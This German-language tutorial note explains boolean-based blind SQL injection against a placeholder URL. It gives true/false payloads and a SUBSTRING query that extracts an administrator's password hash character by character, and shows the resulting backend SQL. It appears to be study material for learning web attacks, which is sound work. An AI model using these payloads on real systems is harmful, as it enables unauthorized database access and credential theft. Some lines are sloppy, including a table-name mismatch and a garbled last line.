Boolen Based Man stellt der Application eine true/false Frage.

# ‌Boolean Based Blind SQL1
## Beispiel
```sql
www.random.com/app.php?id\=1
// Backend
select title from product where id \=1
```
‌
### Payload #1 (FALSE):
```sql
www.random.com/app.php?id\=1 and 1\=2
//backend
select title from product where id \=1 and 1\=2
```

### Payload #2 (TRUE):
```sql
www.random.com/app.php?id\=1 and 1\=1
//backend
select title from product where id \=1 and 1\=1
````

## Beispiel 2
> User Table: Admnistrator / e3c33e889e0e1b62cb...

### Payload :
```sql
www.random.com/app.php?id\=1 and SUBSTRING((SELECT Password FROM Users WHERE Username \= 'Administrator'), 1, 1) \= 's'
Backend:
‌select title from product where id =1 and SUBSTRING((SELECT Password FROM User WHERE Username = 'Administrator'), 1, 1) ='s'
```
- "1, 1)" : Extrahiere das erste Zeichen und nur 1 Zeichen lang.
- "='s'" : Ist es ein 's'?
Wenn kein Output angezeigt wird -> Returned false -> 's' ist nicht das erste Zeichen from hashed Passwort

### Payload :
```sql
www.random.com/app.php?id\=1 and SUBSTRING((SELECT Password FROM Users WHERE Username \= 'Administrator'), 1, 1) \= 'e'
```
-> Titel der id=1 wird angezeigt -> Returned true -> 'e' ist das erste Zeichen vom hashed Passwort





Beispiel
www.random.com/app.php?id\=id\=1
